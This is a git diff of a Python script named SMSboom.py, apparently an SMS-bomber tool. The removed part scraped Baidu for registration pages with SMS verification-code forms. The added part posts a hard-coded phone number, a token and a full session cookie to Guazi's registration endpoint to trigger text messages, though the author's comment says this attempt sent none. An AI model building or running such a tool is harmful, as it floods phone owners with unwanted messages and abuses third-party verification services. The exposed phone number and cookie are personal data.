@@ -6,90 +6,46 @@
 # @File    : SMSboom.py
 # @Software: PyCharm
 """
+破解瓜子二手车的登录js，实现发短信
+
+时间戳=(new Date).getTime()+ 864e5
+
+本次尝试v1.0 没有返回信息，没有发短信
 
 """
 import requests
-from bs4 import BeautifulSoup
-import time
-import re
+
+baseurl = "https://www.guazi.com/zq_user/?act=register"
 
 
-# 将百度的url转成真实的url
-def convert_url(url):
-    resp = requests.get(url=url,
-                        headers=headers,
-                        allow_redirects=False
-                        )
-    return resp.headers['Location']
+def getTimeNow():
+    import time
+    time = int(time.time()*1000) + 864000000
+    time = int(time/1000)
+    return time
 
+data = {
+    "phone":"18256993059",
+    "time": str(getTimeNow()),
+    "token": "ca4335388208374ba3c28ffa14fd5911"
+}
 
-# 获取url
-def get_url(wd):
-    # 将爬取到的url保存，如不需要删除相关代码
-    file_url = open('url.txt', 'a+')
-    list = []
-    s = requests.session()
-    r = s.get("https://www.baidu.com/s?wd=" + wd + "&pn=1", headers=headers)
-    soup = BeautifulSoup(r.text, 'lxml')
-    for so in soup.select('#content_left .t a'):
-        g_url = so.get('href')
-        list.append(convert_url(g_url))
-        file_url.write(convert_url(g_url) + '\n')
-    screen(list)
-    list.clear()
-    # 程序停止8秒，避免爬取太快被禁止访问
-    time.sleep(8)
-    # 10为第2页，20为第三页，30为第四页，以此类推
-    for i in range(10, 600, 10):
-        url = 'https://www.baidu.com/s'
-        params = {
-            "wd": wd,
-            "pn": i,
-            "oq": wd
-        }
-        r = s.get(url=url, headers=headers, params=params)
-        soup = BeautifulSoup(r.text, 'lxml')
-        for so in soup.select('#content_left .t a'):
-            g_url = so.get('href')
-            list.append(convert_url(g_url))
-            file_url.write(convert_url(g_url) + '\n')
-        screen(list)
-        list.clear()
-        # 不能总是停止8秒，不知道影不影响，但是保险起见模仿的像人随机一点
-        # 但其实可以不用的，因为screen方法执行的时间肯定不一样，别问我那为什么不改，我任性
-        time.sleep(10 + (i / 10))
-    file_url.close()
+headers = {
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+    "Connection": "keep-alive",
+    "Content-Length": len(data),
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Cookie": "antipas=yE5e750z91285D3l311T5565605c; uuid=23de5174-8305-42b0-fb93-8add0c067d85; ganji_uuid=8617006169346087194609; lg=1; Hm_lvt_936a6d5df3f3d309bda39e92da3dd52f=1588944800; track_id=74809468183236608; cityDomain=chuzhou; clueSourceCode=%2A%2300; user_city_id=128; preTime=%7B%22last%22%3A1588991167%2C%22this%22%3A1588944796%2C%22pre%22%3A1588944796%7D; guazitrackersessioncadata=%7B%22ca_kw%22%3A%22-%22%7D; sessionid=ca09d2f7-1f41-4760-8111-9ebfb6de0b35; cainfo=%7B%22ca_a%22%3A%22-%22%2C%22ca_b%22%3A%22-%22%2C%22ca_s%22%3A%22pz_baidu%22%2C%22ca_n%22%3A%22pcbiaoti%22%2C%22ca_medium%22%3A%22-%22%2C%22ca_term%22%3A%22-%22%2C%22ca_content%22%3A%22%22%2C%22ca_campaign%22%3A%22%22%2C%22ca_kw%22%3A%22-%22%2C%22ca_i%22%3A%22-%22%2C%22scode%22%3A%22-%22%2C%22keyword%22%3A%22-%22%2C%22ca_keywordid%22%3A%22-%22%2C%22ca_transid%22%3A%22%22%2C%22platform%22%3A%221%22%2C%22version%22%3A1%2C%22track_id%22%3A%2274809468183236608%22%2C%22display_finance_flag%22%3A%22-%22%2C%22client_ab%22%3A%22-%22%2C%22guid%22%3A%2223de5174-8305-42b0-fb93-8add0c067d85%22%2C%22ca_city%22%3A%22chuzhou%22%2C%22sessionid%22%3A%22ca09d2f7-1f41-4760-8111-9ebfb6de0b35%22%7D; close_finance_popup=2020-05-09",
+    "Host": "www.guazi.com",
+    "Origin": "https://www.guazi.com",
+    "Referer": "https://www.guazi.com/chuzhou/?ca_s=pz_baidu&ca_n=pcbiaoti&tk_p_mti=ad.pz_baidu.pcbiaoti.1.74809468183236608",
+    "Sec-Fetch-Dest": "empty",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Site": "same-origin",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+    "X-Requested-With": "XMLHttpRequest"
+}
 
-
-# 筛选url
-def screen(list):
-    s_url = open('s_url.txt', 'a+')
-    for url in list:
-        try:
-            requests.packages.urllib3.disable_warnings()
-            r = requests.get(url=url, headers=headers1, verify=False, allow_redirects=False)
-            print(url)
-            # 符合则将该url写入文件
-            if re.search('手机号', r.text) and (
-                    re.search('短信验证码', r.text) or re.search('获取验证码', r.text) or re.search('发送验证码', r.text)):
-                print('符合')
-                s_url.write(url + '\n')
-        except:
-            print('异常')
-            continue
-    s_url.close()
-
-
-if __name__ == '__main__':
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0",
-        "Host": "www.baidu.com",
-    }
-    headers1 = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"
-    }
-    wd = "注册页面"
-    get_url(wd)
-
-
-
+requests.post(url=baseurl, data=data, headers=headers)
